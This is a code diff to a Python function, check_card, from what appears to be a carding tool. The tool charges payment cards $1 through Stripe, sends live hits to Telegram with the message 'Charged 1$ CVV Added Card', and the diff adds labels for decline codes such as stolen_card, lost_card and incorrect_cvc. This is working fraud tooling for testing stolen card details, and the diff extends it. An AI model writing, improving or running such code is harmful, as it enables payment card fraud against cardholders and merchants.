@@ -279,7 +279,31 @@ def check_card(card_details, heroku_auth_key):
                     send_to_telegram(f"{card_details} - Charged 1$ CVV Added Card !!")
                     return result
                 elif status == 'requires_action':
-                    return f"{RED}Unable To Authenticate [3d]{RESET}"
+                    # Check for decline reason in last_payment_error
+                    last_error = response_body.get('last_payment_error', {})
+                    decline_code = last_error.get('decline_code')
+                    error_message = last_error.get('message', '')
+                    
+                    if decline_code == 'insufficient_funds':
+                        return f"{YELLOW}Insufficient Funds{RESET}"
+                    elif decline_code == 'generic_decline':
+                        return f"{RED}The card has been declined (Generic){RESET}"
+                    elif decline_code == 'incorrect_cvc':
+                        return f"{YELLOW}The CVC code is incorrect CCN{RESET}"
+                    elif decline_code == 'do_not_honor':
+                        return f"{RED}The issuing bank does not approve{RESET}"
+                    elif decline_code == 'stolen_card':
+                        return f"{BLUE}The card has been reported stolen{RESET}"
+                    elif decline_code == 'lost_card':
+                        return f"{BLUE}The card has been reported lost{RESET}"
+                    elif decline_code == 'expired_card':
+                        return f"{RED}The card has expired{RESET}"
+                    elif decline_code == 'restricted_card':
+                        return f"{YELLOW}The card cannot be used for this transaction{RESET}"
+                    elif decline_code:
+                        return f"{YELLOW}Decline: {decline_code}{RESET}"
+                    else:
+                        return f"{RED}3D Secure Required{RESET}"
                 else:
                     return f"{YELLOW}{status}{RESET}"
             else:
